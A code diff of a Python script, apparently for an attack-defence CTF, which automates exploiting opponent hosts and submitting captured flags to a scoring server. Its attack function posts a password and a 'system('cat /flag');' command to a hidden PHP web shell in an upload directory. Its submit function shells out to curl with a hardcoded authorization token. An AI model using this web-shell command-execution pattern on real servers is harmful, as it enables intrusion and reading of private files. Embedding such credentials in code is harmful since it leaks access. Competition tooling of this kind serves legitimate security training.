@@ -2,13 +2,7 @@
 import time
 import re
 import subprocess
-
-
-# pwn题
-# from pwn import *
-# web题
 import requests
-
 
 ############################################################
 ###################### READ ME FIREST ######################
@@ -22,50 +16,46 @@ import requests
 # 2、接受flag前一定要把其他回显接收完
 # 3、正式运行时将debug关闭，减少回显
 
+# 格式化输出攻击结果
+
+
+def print_attack_result(ip, port, flag): return print(
+    "[\033[0;36mFLAGS\033[0m] " + ip + ":" + port + "\033[0m flag is : \033[0;36m" + flag + "\033[0m")
+
+
+def print_exc_result(ip, port, p, e): return print("[\033[0;37;41mERROR\033[0m] \033[0;32m" + ip +
+                                                   "\033[0m:\033[0;34m" + port + "\033[0m" + p + "\033[0;31m" + str(e) + "\033[0m")
+
+
 def attack(ip, port):
     try:
-        ################## pwn exploit demo ################
-        # r = remote(ip,port,timeout=10)
-        # # ........payload.......
-        # # r.interactive()
-        # # 将interactive()更改为cat flag或其他命令
-        # r.sendline("cat flag")
-        # # 接受flag前一定要把其他回显接受完
-        # flag = r.recvline().strip()
-        # r.close()
-
-        ################## web exploit demo ################
-        flag_data = {'pass':'q398612964','a':"system('cat /flag');"}
+        ################## 构造payload ################
+        flag_data = {'pass': 'q398612964', 'a': "system('cat /flag');"}
         ret = requests.post("http://" + ip + ":" + port + "/sqlgunadmin/kindedit/attached/20220715/.index.php",
                             data=flag_data, timeout=10)
-        # # ........payload.......
         # # 正则匹配flag
         flag = re.search(r'lhsw\{.*\}', ret.text).group()
-
-        print("[\033[0;36mFLAGS\033[0m] " + ip + ":" + port + "\033[0m flag is : \033[0;36m" + flag + "\033[0m")
-
-        print("[\033[0;32mSUCCE\033[0m] " + ip + ":" + port + " attack success")
+        # #打印攻击结果
+        print_attack_result(ip, port, flag)
         return flag
 
     except Exception as e:
-        print(
-            "[\033[0;37;41mERROR\033[0m] \033[0;32m" + ip + "\033[0m:\033[0;34m" + port + "\033[0m can not attack, because: \033[0;31m" + str(
-                e) + "\033[0m")
+        print_exc_result(ip, port, 'can not attack,because:', str(e))
         return False
 
 
 def submit(ip, port, flag):
     try:
-        # 修改submit的格式
+        # 构造submit的格式
         a = subprocess.Popen(
-            ['curl -X POST http://192.168.15.80:19999/api/flag -H "Authorization: 1b1fae078083811a61e7794e8320755b" -d "{ \"flag\": flag }"'.format(flag=flag)],
+            ['curl -X POST http://192.168.15.80:19999/api/flag -H "Authorization: 1b1fae078083811a61e7794e8320755b" -d "{ \"flag\": flag }"'.format(
+                flag=flag)],
             shell=True, stdout=subprocess.PIPE)
         print(a.stdout.readline())
-        print("[\033[0;32mSUCCE\033[0m] " + ip + ":" + port + " submit success")
+        print("[\033[0;32mSUCCE\033[0m] " +
+              ip + ":" + port + " submit success")
     except Exception as e:
-        print(
-            "[\033[0;37;41mERROR\033[0m] \033[0;32m" + ip + "\033[0m:\033[0;34m" + port + "\033[0m submit failed, because: \033[0;31m" + str(
-                e) + "\033[0m")
+        print_exc_result(ip, port, 'submit failed,because:', str(e))
         return False
 
 
